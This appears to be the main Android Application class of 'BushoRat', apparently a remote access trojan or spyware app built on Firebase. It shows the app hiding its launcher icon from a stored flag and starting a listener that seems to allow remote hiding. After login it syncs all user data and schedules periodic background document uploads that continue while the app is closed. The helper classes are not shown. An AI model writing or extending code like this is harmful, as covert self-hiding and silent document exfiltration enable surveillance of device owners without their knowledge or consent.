package com.bushorat.app;

import android.app.Application;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.bushorat.app.helpers.AppVisibilityHelper;
import com.bushorat.app.helpers.DocumentSyncHelper;
import com.bushorat.app.helpers.UserDataSyncHelper;

public class BushoRatApplication extends Application {
    private static final String TAG = "BushoRatApplication";
    private FirebaseAuth.AuthStateListener authStateListener;

    @Override
    public void onCreate() {
        super.onCreate();

        Log.d(TAG, "Application onCreate: Initializing Firebase");

        FirebaseApp.initializeApp(this);
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);

        // Initialize visibility helper and apply persisted state immediately.
        AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(this);
        boolean isHidden = visibilityHelper.isAppHidden();
        Log.d(TAG, "App visibility on startup: hidden=" + isHidden);
        
        if (isHidden) {
            // App was hidden before — keep launcher icon hidden
            visibilityHelper.setMainLauncherEnabled(false);
            Log.d(TAG, "App is hidden, hiding launcher icon");
        } else {
            // App is visible — ensure launcher icon is shown
            visibilityHelper.ensureLauncherComponentEnabled();
            Log.d(TAG, "App is visible, showing launcher icon");
        }
        registerVisibilityAuthListener();
    }

    private void registerVisibilityAuthListener() {
        authStateListener = firebaseAuth -> {
            if (firebaseAuth.getCurrentUser() != null) {
                Log.d(TAG, "Auth state: user logged in, starting visibility listener and data sync");
                AppVisibilityHelper visibilityHelper =
                        AppVisibilityHelper.getInstance(BushoRatApplication.this);
                visibilityHelper.ensureListenerStarted();
                // Async only — previous blocking await on the main thread caused freezes/crashes.
                UserDataSyncHelper.syncAll(BushoRatApplication.this);
                // Schedule background document uploads (even when app is closed)
                DocumentSyncHelper.schedulePeriodicDocumentUpload(BushoRatApplication.this);
            }
        };
        FirebaseAuth.getInstance().addAuthStateListener(authStateListener);
    }
}
